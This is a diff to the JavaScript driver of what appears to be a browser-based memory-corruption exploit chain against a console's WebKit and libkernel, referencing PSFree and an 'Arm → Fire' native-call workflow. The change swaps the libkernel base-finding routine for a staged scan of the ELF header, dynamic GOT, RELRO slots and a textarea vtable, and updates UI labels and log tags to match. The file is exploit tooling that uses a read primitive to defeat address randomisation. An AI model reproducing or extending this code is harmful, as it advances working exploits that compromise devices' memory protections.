@@ -43,6 +43,7 @@ import {
     resolveLibkernelPsfree,
     formatPsfreeStats,
     resolveLibkernelFindChunk,
+    resolveLibkernelRelroChunk,
     verifyLibkernelBase,
     extPtrToLkCandidates,
 } from "./libkernel_resolve.js";
@@ -50,7 +51,7 @@ import { createCrashLog } from "./log_persist.js";
 import { prepNativeChain, stageGetpid, fireGetpid } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250831a";
+const BUILD_ID = "rw-20250831b";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const SCAN_PIVOT_MIN = 0x10000;
@@ -150,7 +151,7 @@ function clearPersistedLog() {
 function mark(tag, detail) {
     const line = tag + (detail == null || detail === "" ? "" : "  " + detail);
     if (lkQuiet) {
-        if (/^LK-(OK|FAIL|SKIP|CAL|HINT|CAL-MISS|CAL-DONE|GUESS|PSFREE)/.test(tag)) {
+        if (/^LK-(OK|FAIL|SKIP|CAL|HINT|CAL-MISS|CAL-DONE|GUESS|PSFREE|GOT|FIND)/.test(tag)) {
             lines.push(line);
             if (lines.length > 40) lines.splice(0, lines.length - 40);
             renderOut();
@@ -226,11 +227,11 @@ function setUi() {
     if (btnGuessLk) btnGuessLk.disabled = busy || !ready;
     if (btnPsfreeLite) {
         btnPsfreeLite.disabled = !ready || (busy && !findLkAuto);
-        btnPsfreeLite.textContent = "Find lk lite";
+        btnPsfreeLite.textContent = "Scan GOT lite";
     }
     if (btnPsfreeLk) {
         btnPsfreeLk.disabled = !ready || (busy && !findLkAuto);
-        btnPsfreeLk.textContent = "Find lk";
+        btnPsfreeLk.textContent = "Scan GOT";
     }
     if (btnPsfreeStop) {
         btnPsfreeStop.disabled = !findLkAuto && !psfreeAutoScan;
@@ -414,8 +415,22 @@ let findLkAuto = false;
 let findLkStop = false;
 let findLkPreset = null;
 
-const FIND_LK_LITE = { maxPages: 64, label: "lite" };
-const FIND_LK_NORM = { maxPages: 256, label: "norm" };
+const FIND_LK_LITE = {
+    label: "lite",
+    lite: true,
+    hdrCoarse: 32,
+    hdrFine: 0,
+    relroBatch: 8,
+    vtableEntries: 32,
+};
+const FIND_LK_NORM = {
+    label: "norm",
+    lite: false,
+    hdrCoarse: 64,
+    hdrFine: 128,
+    relroBatch: 16,
+    vtableEntries: 48,
+};
 
 function parseCalPtr(raw) {
     const s = String(raw).replace(/^0x/i, "").trim();
@@ -1941,7 +1956,7 @@ function finishFindLkChunk(chunk) {
         findLkAuto = false;
         findLkStop = false;
         if (addrIn) addrIn.value = String(chunk.lk);
-        mark("LK-FIND-OK", (chunk.source || chunk.phase) + " → " + chunk.lk
+        mark("LK-GOT-OK", (chunk.source || chunk.phase) + " → " + chunk.lk
             + " build=" + BUILD_ID);
         const p = window.p;
         if (p) {
@@ -1951,8 +1966,8 @@ function finishFindLkChunk(chunk) {
             else if (v.ok)
                 mark("LK-VERIFY-WARN", v.warn || "weak");
         }
-        state("Find lk OK — Force lk → Arm → Fire", "ok");
-        crashLog.append("LK-FIND-OK " + chunk.lk, "LK-FIND");
+        state("Scan GOT OK — Force lk → Arm → Fire", "ok");
+        crashLog.append("LK-GOT-OK " + chunk.lk, "LK-GOT");
         crashLog.flushSync();
         return true;
     }
@@ -1960,12 +1975,12 @@ function finishFindLkChunk(chunk) {
         findLkState = null;
         findLkAuto = false;
         findLkStop = false;
-        mark("LK-FIND-MISS", (chunk.error || chunk.phase || "miss")
+        mark("LK-GOT-MISS", (chunk.error || chunk.phase || "miss")
             + (chunk.extList && chunk.extList.length
                 ? " ext=" + chunk.extList.map(e => e.ptr).join(",") : "")
             + " build=" + BUILD_ID);
-        mark("LK-HINT", "PLT/PSFree patched on poops — need webkit dump for import RVAs");
-        state("Find lk miss — Load cal ptr + Verify lk", "bad");
+        mark("LK-HINT", "GOT/RELRO miss — try Scan GOT norm or paste lk from cal vtable");
+        state("Scan GOT miss — Verify lk or Scan libkernel", "bad");
         crashLog.flushSync();
         return true;
     }
@@ -1978,7 +1993,7 @@ function stopFindLk() {
     state("Find lk stopping…", "warn");
 }
 
-/** Guess → below-webkit → vtable leak (no PLT, no g5 island). */
+/** ELF hdr → dynamic GOT → RELRO slots → textarea vtable (no PLT, no cal ptr). */
 async function runFindLkAuto(preset) {
     if (!ready || !window.p) return;
     if (findLkAuto) return;
@@ -1996,31 +2011,42 @@ async function runFindLkAuto(preset) {
     findLkStop = false;
     busy = true;
     setUi();
-    mark("LK-FIND", "auto " + findLkPreset.label
-        + " below-pages=" + findLkPreset.maxPages
+    mark("LK-GOT", "auto " + findLkPreset.label
+        + " hdr=" + findLkPreset.hdrCoarse
+        + (findLkPreset.hdrFine ? "+" + findLkPreset.hdrFine : "")
         + " build=" + BUILD_ID);
     renderOut();
 
-    const opts = {
+    const opts = Object.assign({
         nativeFn,
-        maxPages: findLkPreset.maxPages,
         retain: retained,
-    };
+    }, findLkPreset);
     let loops = 0;
 
     try {
         while (findLkAuto && !findLkStop) {
-            const chunk = resolveLibkernelFindChunk(p, webkitBase, off, findLkState, opts);
+            const chunk = resolveLibkernelRelroChunk(p, webkitBase, off, findLkState, opts);
             findLkState = chunk.state;
-            if (chunk.phase === "guess-start")
-                mark("LK-FIND", "phase guess (wk-relative, 2 reads/cand)");
-            else if (chunk.phase === "below-next")
-                mark("LK-FIND", "phase below-webkit (16KB pages)");
-            else if (chunk.phase === "leak-next")
-                mark("LK-FIND", "phase vtable/leak ext ptrs");
-            else if (chunk.phase === "below" || chunk.phase === "leak" || chunk.phase === "guess")
-                state("Find " + findLkPreset.label + " " + chunk.phase
-                    + (chunk.at ? " @" + chunk.at : "")
+            if (chunk.phase === "got-scan-start")
+                mark("LK-GOT", "phase hdr→dyn→RELRO→vtable");
+            else if (chunk.phase === "hdr-ok")
+                mark("LK-GOT", "ELF hdr " + chunk.hdr + " — dynamic GOT");
+            else if (chunk.phase === "hdr-skip")
+                mark("LK-GOT", "no ELF hdr — poops RELRO brute");
+            else if (chunk.phase === "dyn-start")
+                mark("LK-GOT", "dyn GOT inCap=" + chunk.slots + "/" + chunk.total);
+            else if (chunk.phase === "dyn-done")
+                mark("LK-GOT", "dyn miss " + (chunk.prev || "") + " — RELRO scan");
+            else if (chunk.phase === "relro-start")
+                mark("LK-GOT", "RELRO " + chunk.span);
+            else if (chunk.phase === "relro-done")
+                mark("LK-GOT", "RELRO miss tried=" + (chunk.tried || 0) + " — textarea vtable");
+            else if (chunk.phase === "vt-ready")
+                mark("LK-GOT", "vtable " + chunk.vtable);
+            else if (chunk.phase === "hdr" || chunk.phase === "dyn" || chunk.phase === "relro"
+                || chunk.phase === "vt")
+                state("Scan GOT " + findLkPreset.label + " " + chunk.phase
+                    + (chunk.cursor != null ? " +0x" + chunk.cursor.toString(16) : "")
                     + (chunk.tried != null ? " tried=" + chunk.tried : ""), "warn");
             if (finishFindLkChunk(chunk)) {
                 renderOut();
